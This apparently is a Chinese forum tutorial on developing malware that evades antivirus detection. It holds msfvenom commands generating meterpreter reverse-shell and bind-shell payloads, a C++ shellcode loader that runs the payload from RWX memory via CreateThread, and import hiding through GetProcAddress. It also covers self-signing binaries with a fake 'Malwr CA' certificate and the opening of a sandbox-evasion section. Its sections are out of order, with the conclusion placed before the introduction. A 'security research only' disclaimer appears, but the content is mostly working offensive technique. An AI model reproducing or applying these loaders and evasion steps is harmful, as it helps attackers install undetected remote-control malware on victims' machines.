
```C++
typedef LPVOID(WINAPI\* MyVirtualAlloc)(
LPVOID lpAddress,
SIZE\_T dwSize,
DWORD flAllocationType,
DWORD flProtect
);
typedef BOOL(WINAPI\*
MyVirtualProtect)(
LPVOID lpAddress,
SIZE\_T dwSize,
DWORD flNewProtect,
PDWORD lpflOldProtect
);
typedef HANDLE(WINAPI\*
MyCreateThread)
(
LPSECURITY\_ATTRIBUTES lpThreadAttributes,
SIZE\_T dwStackSize,
LPTHREAD\_START\_ROUTINE lpStartAddress,
LPVOID lpParameter,
DWORD dwCreationFlags,
LPDWORD lpThreadId
);
typedef DWORD(WINAPI\*
MyWaitForSingleObject)
(
HANDLE hHandle,
DWORD dwMilliseconds
);
int main() {
MyVirtualAlloc defVirtualAlloc = (MyVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
MyVirtualProtect defVirtualProtect = (MyVirtualProtect)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
MyCreateThread defCreateThread = (MyCreateThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
MyWaitForSingleObject defWaitforSingleObject = (MyWaitForSingleObject)GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
.......
}
```

重新生成，再次打开：

![image-20220118101426410](upload/attach/202201/941431\_A58NXEE4UQEGDQY.jpg)

## 最后

综合一下这几个小项目，得到一个能过大部分杀软静态扫描的项目：

![image-20220118101640707](upload/attach/202201/941431\_Z85V726XBYADBHG.jpg)

参考链接：

<mark class="encrypted">6f7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6C8L8$3E0C8k6g2)9J5c8Y4c8A6L8Y4W2Q4x3X3c8m8c8g2y4Q4x3X3c8U0</mark>

<mark class="encrypted">4d0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8S2P5h3I4G2j5h3c8K6i4K6u0W2L8$3&6D9K9h3&6W2i4K6u0r3</mark>

<mark class="encrypted">631K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6G2N6i4c8X3L8r3q4F1K9#2)9J5k6h3&6D9i4K6u0r3j5X3I4G2k6#2)9J5c8U0t1H3x3e0W2Q4x3V1j5H3y4W2)9J5c8U0p5&6i4K6u0r3M7X3g2V1i4K6u0V1N6r3g2S2L8g2)9J5k6s2c8S2j5%4c8A6j5%4y4Q4x3X3c8U0L8$3#2T1K9h3&6A6L8X3N6Q4x3X3c8V1K9i4u0W2j5%4c8Q4x3X3c8K6P5i4y4@1k6h3#2Q4x3X3c8U0j5h3I4D9M7#2)9J5k6r3q4F1k6q4)9J5k6s2y4J5k6r3W2Q4x3X3c8@1L8#2)9J5k6r3u0&6M7r3q4K6M7#2)9J5k6r3q4$3i4K6u0V1k6h3c8J5i4K6u0r3</mark>

# 恶意代码开发

**以下内容仅用于安全研究**

## 前言

**目的是能过杀软静态扫描并且能执行上线。**

开发平台：Windows 10

开发工具：MS Visual Studio 2019

开发语言： C++

### 杀软检测工作原理

/***引用鸡哥的话术***/

静态查杀：主要基于hash和特征码，hash可以是文件的hash或导入表之类的hash，特征码可以是是PE头、pdb、全局字符串、互斥体之类的信息。

动态查杀：基于API的监控和沙箱执行，杀软会通过对ntdll的关键API进行hook，实现对程序的API监控。另外可以在内核中注册一系列的回调函数实现对行为的监控。

启发式：多数杀软采用的是基于权重的启发式，就是一套加减分的规则，用于检测程序的潜在恶意行为，如程序在沙盒或模拟器环境运行，在此过程中有操作端口和通讯的函数，并将自身加载到启动项中等上述行为，则很有可能被判定为恶意，另外一些畸形区块也可触发。

### 杀躲避检测技术

- 多态(重新编译)对抗基于签名的检测。
- 代码流的混淆对抗启发式检测。
- 基于环境的检测对抗沙箱。
- 敏感信息编码或加密对抗基于签名和启发式。

## 基本知识

**生成shellcode**

Shellcode 是设计用于运行本地或远程系统 shell 的机器代码片段（因此得名）。它们主要用于利用软件漏洞 - 当攻击者能够控制程序的执行流程时，他需要一些通用有效负载来执行所需的操作（通常是 shell 访问）。这适用于本地开发（例如权限提升）和远程开发（用于在服务器上获得 RCE）。

Shellcode 是一种引导代码，它利用已知的特定于平台的机制来执行特定操作（创建进程、启动 TCP 连接等）。Windows shellcode 通常使用 TEB（线程环境块）和 PEB（进程环境块）来查找加载的系统库（`kernel32.dll`，`kernelbase.dll`或`ntdll.dll`）的地址，然后“浏览”它们以找到可用于定位其他函数的地址`LoadLibrary`和`GetProcAddress`函数。

使用最快捷的方式生成shellcode，比如Metasploit 或者CobaltStrike：

|  |  |
| --- | --- |
| 1  2  3  4 | `举个栗子：`  `msfvenom` `-``p windows``/``x64``/``meterpreter``/``reverse_tcp  lhost``=``192.168``.``220.134` `lport``=``6666` `-``f c >re_shellcode.c` `#反向shell`  `msfvenom` `-``p windows``/``shell_bind_tcp LPORT``=``4444` `-``f c` `#正向shell`  `msfvenom` `-``p windows``/``x64``/``exec` `CMD``=``calc.exe` `-``f c` `#弹计算器` |

生成的 shellcode 可以作为字符串包含在二进制文件中。char 数组的经典执行涉及将此数组转换为指向函数的指针，如下所示：

|  |  |
| --- | --- |
| 1  2  3  4 | `void (``*``func)();`  `func` `=` `(void (``*``)()) code;`  `func();`  `/``/``(``*``(void(``*``)()) code)();` |

**执行shellcode**

执行 shellcode 的实际方式有点不同。我们需要：

- 使用[`VirtualAlloc`](https://bbs.kanxue.com/elink@a7dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8X3#2W2L8h3!0J5P5h3q4H3K9g2)9J5c8X3&6X3i4K6u0V1L8h3g2E0L8%4u0&6j5i4m8A6i4K6u0V1N6X3W2J5N6s2g2S2L8r3q4D9L8r3!0U0)（或[`VirtualAllocEx`](https://bbs.kanxue.com/elink@378K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3M7r3I4Q4x3X3c8H3L8q4)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8X3#2W2L8h3!0J5P5h3q4H3K9g2)9J5c8X3&6X3i4K6u0V1L8h3g2E0L8%4u0&6j5i4m8A6i4K6u0V1N6X3W2J5N6s2g2S2L8r3q4D9L8r3!0U0k6i4R3`.)为远程进程）Windows API 函数分配一个新的内存区域，
- 用 shellcode 字节填充它（例如，使用[`RtlCopyMemory`](https://bbs.kanxue.com/elink@aa4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6V1k6r3W2Q4x3V1k6%4k6r3#2Q4x3V1k6F1k6W2)9J5k6s2N6V1L8g2)9J5k6s2u0@1L8r3y4G2M7s2W2E0k6h3#2G2M7Y4V1`.)基本上是一个`memcpy`包装器的函数），
- 分别使用[`CreateThread`](https://bbs.kanxue.com/elink@eeeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8Y4m8J5L8$3y4W2M7%4y4@1K9s2u0W2j5h3c8K6j5i4m8A6i4K6u0r3L8X3k6Q4x3X3c8H3M7X3!0U0k6i4y4K6N6r3S2J5k6h3q4V1M7$3q4H3K9g2)9J5k6r3y4J5k6h3q4@1k6i4c8Z5M7X3g2S2k6l9`.`.)或[`CreateRemoteThread`](https://bbs.kanxue.com/elink@6e0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3M7r3I4Q4x3X3c8H3L8q4)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8Y4m8J5L8$3y4W2M7%4y4@1K9s2u0W2j5h3c8K6j5i4m8A6i4K6u0r3L8X3k6Q4x3X3c8H3M7X3!0U0k6i4y4K6N6r3S2J5k6h3q4V1M7$3q4H3K9g2)9J5k6r3y4J5k6h3q4@1k6i4u0W2L8h3!0@1k6i4c8Z5M7X3g2S2k6l9`.`.)函数创建一个新线程。

Shellcode 也可以使用 char 数组来执行函数指针转换，只要 shellcode 所在的内存区域被标记为可执行。

```
##include <Windows.h>
void main()
{
const char shellcode[] = " ";
PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
DWORD threadID;
HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
WaitForSingleObject(hThread, INFINITE);
}
```

**针对 VirusTotal 的优化**

在发布我们的可执行文件之前，我们应该确保从二进制文件中删除一些工件。比如丢弃任何调试符号和信息——这可以通过将构建配置切换到“发布”并禁用调试信息的生成（项目属性中的链接器配置）来实现。

![image-20210929094017206](https://bbs.kanxue.com/upload/attach/202201/941431_WM84A3MJJR3QWKQ.jpg)

在使用 Visual Studio 时，PDB（程序数据库）路径默认嵌入在二进制文件中。PDB 用于存储调试信息，该文件与可执行文件（或 DLL）本身存储在同一目录中。这条路径可能会泄露一些敏感信息-比如：`"C:\users\user\Desktop\project\Release\app.exe"`.

**签名**

某些恶意软件检测引擎可能会将未签名的二进制文件标记为可疑。

举个栗子：

|  |  |
| --- | --- |
| 1  2  3  4 | `int` `main()`  `{`  `return` `0`;  `}` |

![image-20210929100257072](https://bbs.kanxue.com/upload/attach/202201/941431_N3PQC4U2BAZVGFS.jpg)

给生成的PE文件添加签名：

|  |  |
| --- | --- |
| 1  2  3  4  5 | `makecert` `-``r` `-``pe` `-``n` `"CN=Malwr CA"` `-``ss CA` `-``sr CurrentUser` `-``a sha256` `-``cy authority` `-``sky signature` `-``sv MalwrCA.pvk MalwrCA.cer`  `certutil` `-``user` `-``addstore Root MalwrCA.cer`  `makecert` `-``pe` `-``n` `"CN=Malwr Cert"` `-``a sha256` `-``cy end` `-``sky signature` `-``ic MalwrCA.cer` `-``iv MalwrCA.pvk` `-``sv MalwrCert.pvk MalwrCert.cer`  `pvk2pfx` `-``pvk MalwrCert.pvk` `-``spc MalwrCert.cer` `-``pfx MalwrCert.pfx`  `signtool sign` `/``f MalwrCert.pfx` `/``t http:``/``/``timestamp.digicert.com` `/``fd SHA256 AES_decrypt.exe` |

![image-20210929102813896](https://bbs.kanxue.com/upload/attach/202201/941431_CV83PB7FXGH6V64.jpg)

![image-20210929102916005](https://bbs.kanxue.com/upload/attach/202201/941431_ZQCDJYZJAUYBBU5.jpg)

## 过沙箱

**恶意软件动态分析**

可执行文件的动态分析可以由沙箱自动执行，也可以由分析人员手动执行。恶意应用程序通常使用各种方法来对它们正在执行的环境进行指纹识别，并根据情况执行不同的操作。

自动分析在简化的沙盒环境中执行，该环境可能具有某些特定特征，特别是它可能无法模拟真实环境的所有细微差别。手动分析通常在虚拟化环境中执行，并且可能会遇到特定的附加工具（调试器、其他分析软件）。

自动和手动分析都有共同的特点，特别是它们通常在虚拟化环境中执行，如果没有正确配置（强化），可以很容易地检测到。大多数沙箱/分析检测技术都围绕检查特定环境属性（有限资源、指示性设备名称）和工件（特定文件、注册表项的存在）。
